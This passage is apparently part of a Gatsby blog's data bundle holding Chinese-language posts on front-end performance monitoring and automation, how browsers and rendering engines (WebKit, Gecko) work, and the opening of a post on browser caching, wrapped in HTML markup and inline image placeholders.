href="/static/2021-07-23-02-06-34-48e9a93c7eb3196c99b7898458f6c4e7-3091a.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 361px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 66.4819944598338%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAABkUlEQVQoz6WS24pBURzGjb2NsONGnoBn4AEwVy54HEleYY9DSV5DKZEbF66dcg4lheQYKfObtWXscTXNd7H61lrf91//wzIY/olwOJzL5VRVTSaT6XQ6Go1KkvQskGWZw2w2+ymQz+cjkcj9jv3tdtvv96fTCTIejy0WC+eSAERRlOFwyNX5fEYGyWQydzNvsq9UKtVqdbVadbtdq9WK7V2AZ51OZ6PRIHS9Xq/Vaoix6Mzr9Xq73UJ6vR4ezt8EIGazud1uc3U8Hne7HYRk72a32/0hEAqFAoGAz+fTPA8YjUav1+v3+9GwBoNBj8ejaxsGRH/uNkkqAg6Hg5WCXzW0kHOXy4XGZrNpdX0jHo9vNhtKHQwGs9msXC6bTKbnmpGWSqXFYjGZTJgF4kQioWtYv99vNpuXy2U0GhGebtNnouAnHUJfr9elAOJUKqUzz+dzFBBGarfbqV8WQECehMZ8OBy0ifyY+T2k1Gq1Op0OWRWLxde0C4XCdDolOr8AcSwW0/VZ+0+QX3N6TOsZmuYL53b0tLyR3JwAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 02 06 34" title="" data-src="/static/2021-07-23-02-06-34-48e9a93c7eb3196c99b7898458f6c4e7-3091a.png" data-srcset="/static/2021-07-23-02-06-34-48e9a93c7eb3196c99b7898458f6c4e7-07e05.png 200w,\n/static/2021-07-23-02-06-34-48e9a93c7eb3196c99b7898458f6c4e7-3091a.png 361w" data-sizes="(max-width: 361px) 100vw, 361px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>一个合理的性能优化方案，一定是通过线上的性能监控数据，或者前端自动化性能测试分析，发现性能问题，针对发现的问题进行分析与定位，然后进行对应的性能优化，最后上线观察。之后又会进入到下一个性能优化的循环中。所以推行性能优化，一定要注重优化工程的可持续性。</p>\n<h2 id="监控与测试"><a href="#%E7%9B%91%E6%8E%A7%E4%B8%8E%E6%B5%8B%E8%AF%95" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>监控与测试</h2>\n<p>性能监控与测试也是一块非常大的话题，包括监控的手段、分析的维度等等，如果后续有机会希望把这块再补充上来。这里先介绍一下。</p>\n<p>我们一般会把性能数据分为两种：</p>\n<ul>\n<li>一种叫 Lab data，主要是在开发和测试人员本地或内部测试机器上跑出来的数据，例如在 CI/CD 中加入 lighthouse。它的优点在于采集的指标更全面，也易于复现问题；缺点主要在于有时候可能不能反应真实的用户体验情况。</li>\n<li>另一种叫 Field data，也被称为 RUM (Real User Monitoring)，是指采集线上实际的性能数据来进行监控。它的优点则是能更好地发现用户实际遇到的性能问题；缺点主要是比较难以调试与复现问题，同时采集到的指标的详细程度不及 Lab data。</li>\n</ul>\n<p>而 <a href="https://csswizardry.com/2018/10/three-types-of-performance-testing/" target="_blank" rel="nofollow noreferrer noopener">The Three Types of Performance Testing</a> 则进一步划分出了三类性能测试。</p>\n<ul>\n<li>第一种叫做 Proactive：它可以理解为是工程师在开发阶段，通过浏览器调试等本地工具来发现并解决性能问题（善于利用 Chrome DevTools 也是一个优秀前端工程师所需要具备的）；</li>\n<li>第二种叫做 Reactive：它是一种自动化的性能测试，可以集成到自动化测试或流水线的其他阶段，会在构建与每次发布前执行；</li>\n<li>第三种叫做 Passive：它就是在产品发布后，通过收集线上数据（或用户反馈）来发现性能问题，主要是基于一些 RUM。</li>\n</ul>\n<p>选择哪种性能测试呢？答案是将它们结合使用（就像是自动化测试会结合单元测试、集成测试与端到端测试）。</p>\n<p>对于一些易于标准化的性能标准，可以考虑使用 Proactive 和 Reactive 这样的 Lab data 来避免性能问题；而对于更复杂的业务场景，则可以通过 Passive 模式下的 Field data 进行监控。</p>\n<h2 id="自动化"><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自动化</h2>\n<p>在性能优化上，请务必将可以自动化的工作都自动化。</p>\n<p>前端性能优化的链路包括了「缓存 -> 发送请求 -> 等待响应 -> 解析 -> 处理各类静态资源 -> 运行时 -> 预加载（等待后续的请求）」，还是比较复杂的。因此，建议通过一些工具来将工作自动化。否则很可能无法保证性能优化的持续实施，因为它从来不是一锤子买卖。</p>\n<p>在旅程中的各个技术点上，我也都会提到一些帮助快速实现优化或自动化的工具，例如 Workbox 提供的各类缓存方案、图片压缩的工具、webpack 插件等。还包括上面提到的，可以在 CI/CD 中集成的 lighthouse 这样的分析工具。而对于 RUM，如果你们公司有人力可以自建一套体系，如果自建成本较高，可以考虑接入一些免费或收费的商业公司产品。</p>',
id:"/home/runner/work/GatsbyBlog/GatsbyBlog/blog/前端性能优化手段/index.md absPath of file >>> MarkdownRemark",timeToRead:41,frontmatter:{date:"2021-07-20 23:24:22",path:"/front-end-performance-optimization-2021/",tags:"面试, 前端, 前端性能优化",title:"前端性能优化手段",draft:null}},{excerpt:"简介 网络浏览器很可能是使用最广的软件。在这篇入门文章中，我将会介绍它们的幕后工作原理。我们会了解到，从您在地址栏输入 google.com 直到您在浏览器屏幕上看到 Google 首页的整个过程中都发生了些什么。 浏览器的主要功能 浏览器的主要功能就是向服务器发出请求，在浏览器窗口中展示您选择的网络资源。这里所说的资源一般是指 HTML 文档，也可以是 PDF、图片或其他的类型。资源的位置由用户使用 URI（统一资源标示符）指定。 浏览器解释并显示 HTML 文件的方式是在 HTML…",html:'<h1 id="简介"><a href="#%E7%AE%80%E4%BB%8B" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>简介</h1>\n<p>网络浏览器很可能是使用最广的软件。在这篇入门文章中，我将会介绍它们的幕后工作原理。我们会了解到，从您在地址栏输入 google.com 直到您在浏览器屏幕上看到 Google 首页的整个过程中都发生了些什么。</p>\n<h2 id="浏览器的主要功能"><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>浏览器的主要功能</h2>\n<p>浏览器的主要功能就是向服务器发出请求，在浏览器窗口中展示您选择的网络资源。这里所说的资源一般是指 HTML 文档，也可以是 PDF、图片或其他的类型。资源的位置由用户使用 URI（统一资源标示符）指定。</p>\n<p>浏览器解释并显示 HTML 文件的方式是在 HTML 和 CSS 规范中指定的。这些规范由网络标准化组织 W3C（万维网联盟）进行维护。</p>\n<p>多年以来，各浏览器都没有完全遵从这些规范，同时还在开发自己独有的扩展程序，这给网络开发人员带来了严重的兼容性问题。如今，大多数的浏览器都是或多或少地遵从规范。</p>\n<p>浏览器的用户界面有很多彼此相同的元素，其中包括：</p>\n<ul>\n<li>用来输入 URI 的地址栏</li>\n<li>前进和后退按钮</li>\n<li>书签设置选项</li>\n<li>用于刷新和停止加载当前文档的刷新和停止按钮</li>\n<li>用于返回主页的主页按钮</li>\n</ul>\n<p>奇怪的是，浏览器的用户界面并没有任何正式的规范，这是多年来的最佳实践自然发展以及彼此之间相互模仿的结果。HTML5 也没有定义浏览器必须具有的用户界面元素，但列出了一些通用的元素，例如地址栏、状态栏和工具栏等。当然，各浏览器也可以有自己独特的功能，比如 Firefox 的下载管理器。</p>\n<h2 id="浏览器的高层结构"><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E9%AB%98%E5%B1%82%E7%BB%93%E6%9E%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>浏览器的高层结构</h2>\n<p>浏览器的主要组件为</p>\n<ol>\n<li>用户界面 - 包括地址栏、前进/后退按钮、书签菜单等。除了浏览器主窗口显示的您请求的页面外，其他显示的各个部分都属于用户界面。</li>\n<li>浏览器引擎 - 在用户界面和呈现引擎之间传送指令。</li>\n<li>呈现引擎 - 负责显示请求的内容。如果请求的内容是 HTML，它就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。</li>\n<li>网络 - 用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。</li>\n<li>用户界面后端 - 用于绘制基本的窗口小部件，比如组合框和窗口。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。</li>\n<li>JavaScript 解释器。用于解析和执行 JavaScript 代码。</li>\n<li>数据存储。这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。</li>\n</ol>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-01-39-18-ef0cba0f69ceb3cb3cef518356eaaa26-28759.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 500px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 67.80000000000001%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsSAAALEgHS3X78AAADKUlEQVQoz2PwsbN7eeTIg337Hu3fD0QP9+27vWvXnT27b+7ccWf3boggUPb5kSPn1qwR4ednYGDozPQ7vKQ7PtiTIcXL6//Nm3/On/9/8eL/S5f+nTv3/9DB3wf2/d2z+9+RwyDBixf/Xbjw//Kl9/v2yIqKAjWfX1b3/9vVuf0NDEoiIgXOTjlOjrlw5OjQFp9S4uGRBxPJsrerDw0rCwxiZWJiZmQ4Obv0/8uT09sqGLj4BbQsbbQsrUHIykbXxh7IcApL0Ld31jS3ArK1rWxUTcxEZRXFpeWB1rIyM56eW/7/7ZkZ7ZUMvjEJj///v/n3z20g+efv2bffLnz8c+r1l7Nvv9/69x8oeOvv3/v//ycV1Skpa3HzCQkKCB6bWfz//sGZHVUMtsFR2z7/X//i54ZXv4Hk0rtvl919t+L+hyW3X69/+Qsk+PLXxnf/IooaDc2cFTUMFZU1Dk7N/3Vt56zOKgZmNnZ2UQk44pSQZhMR17Bx55VVZBUWA4pwiEky8QkIiErLyKsCnc3OwnRkRtG/W3tmAW0W4BNormrrburrqO/ubOjtbuoHsqf0zu1tmdjV0NvZ0AMU72uZEBqaLCqlANTMwcZyaFrB7+tgmzXVdX68/v33/f9/H/7/evv32a0fT29+f3L9y6Pr3748//v/I1Dwz/+f/6dMXMwrJAmx+egMoJ8PgGwWE5GY2LZ0wdRtE1oWTWhe0tu4cHLHipl9G3oa5k1oWTyhefHE1qWLp++KisgXlVZEhPbr06DQBgJObn5pRR0gg5GJCUjy8AlJK2iCuIwgLhAISSjyCooJicOjqgyqedKslv4ZrXOWT80ujOfi5i2p6azvmFbfObO5e4aHXzgrC0tFZWXfhCntHd0TJk728PAA6j+3qPr/xwuze2oZXv06/+jrsVe/zp29uUlSTu7i4x9Hrn7effrl9Zf/26cuE+AXuHfv3tWrV86fP/fs6dNp06YDNW/szPh2cXNDQQrDiafz99+ecfLZgtkbynkFRHqXXepfebVj4ZlZW59GZraxs7HMmTt35cqVixcv3rhxY2pqKijMWFm4gOHGyAgA7BWbacaq9eYAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 01 39 18" title="" data-src="/static/2021-07-20-01-39-18-ef0cba0f69ceb3cb3cef518356eaaa26-28759.png" data-srcset="/static/2021-07-20-01-39-18-ef0cba0f69ceb3cb3cef518356eaaa26-6ac48.png 200w,\n/static/2021-07-20-01-39-18-ef0cba0f69ceb3cb3cef518356eaaa26-4b8bf.png 400w,\n/static/2021-07-20-01-39-18-ef0cba0f69ceb3cb3cef518356eaaa26-28759.png 500w" data-sizes="(max-width: 500px) 100vw, 500px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>值得注意的是，和大多数浏览器不同，Chrome 浏览器的每个标签页都分别对应一个呈现引擎实例。每个标签页都是一个独立的进程。</p>\n<h1 id="呈现引擎"><a href="#%E5%91%88%E7%8E%B0%E5%BC%95%E6%93%8E" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>呈现引擎</h1>\n<p>呈现引擎的作用就是在浏览器的屏幕上显示请求的内容。</p>\n<p>默认情况下，呈现引擎可显示 HTML 和 XML 文档与图片。通过插件（或浏览器扩展程序），还可以显示其他类型的内容；例如，使用 PDF 查看器插件就能显示 PDF 文档。但是在本章中，我们将集中介绍其主要用途：显示使用 CSS 格式化的 HTML 内容和图片。</p>\n<p>本文所讨论的浏览器（Firefox、Chrome 浏览器和 Safari）是基于两种呈现引擎构建的。Firefox 使用的是 Gecko，这是 Mozilla 公司“自制”的呈现引擎。而 Safari 和 Chrome 浏览器使用的都是 WebKit。</p>\n<p>WebKit 是一种开放源代码呈现引擎，起初用于 Linux 平台，随后由 Apple 公司进行修改，从而支持苹果机和 Windows。</p>\n<h2 id="主流程"><a href="#%E4%B8%BB%E6%B5%81%E7%A8%8B" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>主流程</h2>\n<p>呈现引擎一开始会从网络层获取请求文档的内容，内容的大小一般限制在 8000 个块以内。</p>\n<p>然后进行如下所示的基本流程：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-01-41-38-a092c368798975b5f395e61c43256930-81a6c.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 600px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 10.999999999999998%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsSAAALEgHS3X78AAAAhUlEQVQI1wF6AIX/AL/K2MrP1dfd446YpAIHD3Z/i9ng58rP1s7V3igwOycvOcrR2svR19rg6HV+iQQJEo2Xotje5MnO1MTP3ADU2d/Y1tTp5+WjqrIWHy2Nk535+fjo5+Xr7O08RlU5RFPp6uzo5+X8+/qPlp8WIC+mrbX59/Xp5+Xh5+2PhlCoUv1vvgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="图：呈现引擎的基本流程" title="" data-src="/static/2021-07-20-01-41-38-a092c368798975b5f395e61c43256930-81a6c.png" data-srcset="/static/2021-07-20-01-41-38-a092c368798975b5f395e61c43256930-468c3.png 200w,\n/static/2021-07-20-01-41-38-a092c368798975b5f395e61c43256930-3ff2b.png 400w,\n/static/2021-07-20-01-41-38-a092c368798975b5f395e61c43256930-81a6c.png 600w" data-sizes="(max-width: 600px) 100vw, 600px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>呈现引擎将开始解析 HTML 文档，并将各标记逐个转化成“内容树”上的 DOM 节点。同时也会解析外部 CSS 文件以及样式元素中的样式数据。HTML 中这些带有视觉指令的样式信息将用于创建另一个树结构：呈现树。</p>\n<p>呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。</p>\n<p>呈现树构建完毕之后，进入“布局”处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。下一个阶段是绘制 - 呈现引擎会遍历呈现树，由用户界面后端层将每个节点绘制出来。</p>\n<p>需要着重指出的是，这是一个渐进的过程。为达到更好的用户体验，呈现引擎会力求尽快将内容显示在屏幕上。它不必等到整个 HTML 文档解析完毕之后，就会开始构建呈现树和设置布局。在不断接收和处理来自网络的其余内容的同时，呈现引擎会将部分内容解析并显示出来。</p>\n<h2 id="主流程示例"><a href="#%E4%B8%BB%E6%B5%81%E7%A8%8B%E7%A4%BA%E4%BE%8B" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>主流程示例</h2>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-01-43-09-87db46855bada9c77901560bc2523b62-37d31.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 624px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 46.31410256410256%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsSAAALEgHS3X78AAABhklEQVQoz2NgYmIAIkZGIMnECGQxMIT5JcyfsD4nuZKdnQMowcLCwgiUJhIAzTDUteVg5yKs1NeXMS6WQVpB3C083tTJDajXysEqJCHEIwDIZnTwD8lu7pJSUAaqZGFhZWYGuYKZGchmAJIMq1czrV7FoG+hP3Pv6fyOiTwCoovXT9l/clllUx5QQ2hmUc+6PTIqmkA2xFPYAcRj3Ly8epbWxk7eEvJKQK6ElISarr60jAQrO4eSlo6yjh47J7eiEpOpGauKKtgBQAQMLBZWVqBqNX2T5Wdvrb1yv2zSHBkllX1nN1x5tC+/MktUQWv56WuLj181c/HYsZPx4xfOQ0d5QFaCERSwsLKJSCtIqehx8wvxC/DpGWpraKtx83AzMbNIK6nIKKuwsnNJSjJpabPKyDIzFFeKTpgmYmKjlNcxI6e1B+jnstqs6Ys6EzOj4H5hwBVTb96xX7nObmKrlFDeFl1QrqqjO3le++S5rS5ejkBZVlYWZmYmiBFMYAAxkIkZGH4MANA2VUflGnJyAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="图：WebKit 主流程" title="" data-src="/static/2021-07-20-01-43-09-87db46855bada9c77901560bc2523b62-37d31.png" data-srcset="/static/2021-07-20-01-43-09-87db46855bada9c77901560bc2523b62-89539.png 200w,\n/static/2021-07-20-01-43-09-87db46855bada9c77901560bc2523b62-cb00c.png 400w,\n/static/2021-07-20-01-43-09-87db46855bada9c77901560bc2523b62-37d31.png 624w" data-sizes="(max-width: 624px) 100vw, 624px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-01-43-20-d90282fd6545387767b83e8c344d84dc-37d31.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 624px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 46.47435897435898%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsSAAALEgHS3X78AAABbUlEQVQoz3VRTU/CQBDtTzcx3oxHL/hxMSYaURIvRIMGRQpCMCilaKVsW/u9S9mPAtp2a4saMerLHHZn3sy+eSukC/A0/XngrVNdPAJLlT8g/K5ynqcchVoyWVz/b4Z+CaGqZDkNTbfG4xbQRVWDBD9RuRfeW9TJSEEY1kfgVtPZfP6lLslCsO012z48kx732h3ZsvfFZqFSkzy1pBSLj8ceczOiR8hBu1vqyng6W9YiJAnMZpDZHDI6e32FlPmE0jnD0cQLoYmQizGdzkbQVJGBGIEs58URfHtzhG+jeJpkiGOeJB9rayjYuqrtXDdEoFSs8qV73hzKu/XW9UDxnMIIrAh5E0+nUx8TLYrCZc8QZTf9QX2gDFxdnkjDydDDpKVqmj9mtIPQZf5yFBHD2ARg1Xerd4ZX7skGCuRAakBRxc88Sv7/qjSN48A0NwBYx8FDpT/crta65ujCOj95PnkJXzJfE54v8o1PcfE7Vffy3R2ugdoAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="图：Mozilla 的 Gecko 呈现引擎主流程 " title="" data-src="/static/2021-07-20-01-43-20-d90282fd6545387767b83e8c344d84dc-37d31.png" data-srcset="/static/2021-07-20-01-43-20-d90282fd6545387767b83e8c344d84dc-89539.png 200w,\n/static/2021-07-20-01-43-20-d90282fd6545387767b83e8c344d84dc-cb00c.png 400w,\n/static/2021-07-20-01-43-20-d90282fd6545387767b83e8c344d84dc-37d31.png 624w" data-sizes="(max-width: 624px) 100vw, 624px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>可以看出，虽然 WebKit 和 Gecko 使用的术语略有不同，但整体流程是基本相同的。</p>\n<p>Gecko 将视觉格式化元素组成的树称为“框架树”。每个元素都是一个框架。WebKit 使用的术语是“呈现树”，它由“呈现对象”组成。对于元素的放置，WebKit 使用的术语是“布局”，而 Gecko 称之为“重排”。</p>\n<p>对于连接 DOM 节点和可视化信息从而创建呈现树的过程，WebKit 使用的术语是“附加”。有一个细微的非语义差别，就是 Gecko 在 HTML 与 DOM 树之间还有一个称为“内容槽”的层，用于生成 DOM 元素。我们会逐一论述流程中的每一部分：</p>\n<p>// TODO <a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#Parsing_general" target="_blank" rel="nofollow noreferrer noopener">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#Parsing_general</a></p>',id:"/home/runner/work/GatsbyBlog/GatsbyBlog/blog/浏览器工作原理/index.md absPath of file >>> MarkdownRemark",timeToRead:2,frontmatter:{date:"2021-07-20 01:30:15",path:"/browser-working-principle/",tags:"前端, 浏览器, 高级前端",title:"浏览器工作原理",draft:null}},{excerpt:"…",html:'<h1 id="前言"><a href="#%E5%89%8D%E8%A8%80" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>前言</h1>\n<p>缓存可以说是性能优化中简单高效的一种优化方式了。一个优秀的缓存策略可以缩短网页请求资源的距离，减少延迟，并且由于缓存文件可以重复利用，还可以减少带宽，降低网络负荷。</p>\n<p>对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。</p>\n<h1 id="缓存位置"><a href="#%E7%BC%93%E5%AD%98%E4%BD%8D%E7%BD%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 